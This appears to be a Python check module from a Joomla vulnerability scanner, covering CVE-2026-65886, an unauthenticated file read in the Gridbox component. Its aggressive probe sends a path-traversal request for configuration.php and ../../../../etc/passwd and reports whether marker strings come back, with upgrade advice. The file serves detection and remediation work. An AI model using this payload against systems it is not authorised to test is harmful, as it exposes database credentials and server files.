from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65886"
NAME = "Gridbox photo viewer unauthenticated arbitrary file read"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
READ_PATH = "/index.php?option=com_gridbox&task=uploader.showImage&image="


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    read_target: str = "configuration.php",
    marker: str = "class JConfig",
    traversal_target: str = "../../../../etc/passwd",
    traversal_marker: str = "root:x:0:0:",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    local = client.get(f"{base}{READ_PATH}{read_target}", timeout=timeout)
    local_body = local.get("body", "") or ""
    escaped = client.get(f"{base}{READ_PATH}{traversal_target}", timeout=timeout)
    escaped_body = escaped.get("body", "") or ""
    local_hit = marker in local_body
    traversal_hit = traversal_marker in escaped_body
    evidence: dict[str, object] = {
        "read_target": read_target,
        "read_status": local.get("status"),
        "marker_found": local_hit,
        "traversal_target": traversal_target,
        "traversal_status": escaped.get("status"),
        "traversal_marker_found": traversal_hit,
    }
    if local_hit or traversal_hit:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{READ_PATH}{read_target}",
            evidence=evidence,
            detail=(
                "The photo viewer returned file contents without authentication"
                + (" for configuration.php" if local_hit else "")
                + (" and escaped the web root via ../ traversal" if traversal_hit else "")
                + ". Only structural markers were checked; no secrets were retained."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later (realpath + base-directory + image-type checks) "
                "and rotate the Joomla secret and database credentials."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{READ_PATH}{read_target}",
        evidence=evidence,
        detail=(
            "The photo viewer did not return the expected file markers "
            f"(local={local.get('status')}, traversal={escaped.get('status')})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify that uploader.showImage reads arbitrary paths.",
        patched_detail="Gridbox canonicalises the path, confines it to the upload base and allows images only.",
        action="Upgrade Gridbox to 2.20.2 or later and rotate secrets.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only file-read proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Path Traversal",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65886",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
